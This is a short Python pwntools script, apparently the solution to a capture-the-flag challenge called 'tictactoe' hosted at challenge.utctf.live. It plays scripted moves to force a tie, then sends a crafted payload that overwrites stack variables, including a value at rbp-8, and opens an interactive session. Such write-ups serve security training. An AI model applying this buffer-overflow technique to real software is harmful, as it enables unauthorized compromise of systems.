#!/usr/bin/env python3

from pwn import *

exe = ELF("tictactoe")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r, "break *main+0x94d")
    else:
        r = remote("challenge.utctf.live", 7114)

    return r


def main():
    r = conn()

    r.sendline(b"x")
    
    # Opponent will do the following moves: 1 2 7 6
    # We need to Tie the game
    r.sendline(b"5")
    r.sendline(b"3")
    r.sendline(b"4")

    # NOTE: The program saves all the previous choices backwards as follows:
    #           0x7ffd78295e00 ◂— 0x3300340039000000
    #           0x7ffd78295e08 ◂— 0x786f200078003500
    #
    #       The first choice is saved at 0x7ffd78295e09 and the last one at 0x7ffd78295e04

    payload = flat(
                b"\x39\x00\x34\x00\x33\x00\x35\x00\x78\x00\x20\x6f\x78",
                b"\x02\x00\x00\x00\x02\x00\x00\x00",
                b"\x02\x00\x00\x00\x02\x00\x00\x00",
                b"\x02\x00\x00\x00\x02\x00\x00\x00",
                b"\x02\x00\x00\x00\x02\x00\x00\x00",
                b"\x00\x00\x00\x00\x00\x00\x00\x00",
                b"\x08\x00\x00\x00\x03\x00\x00\x00",
                b"\x02\x00\x00\x00\x04\x00\x00\x00",
                p64(1)      # $rbp-8
            )
    
    r.sendline(payload)
    r.sendline(b"9")        # We still need to send a valid choice
    r.interactive("$ ")


if __name__ == "__main__":
    main()
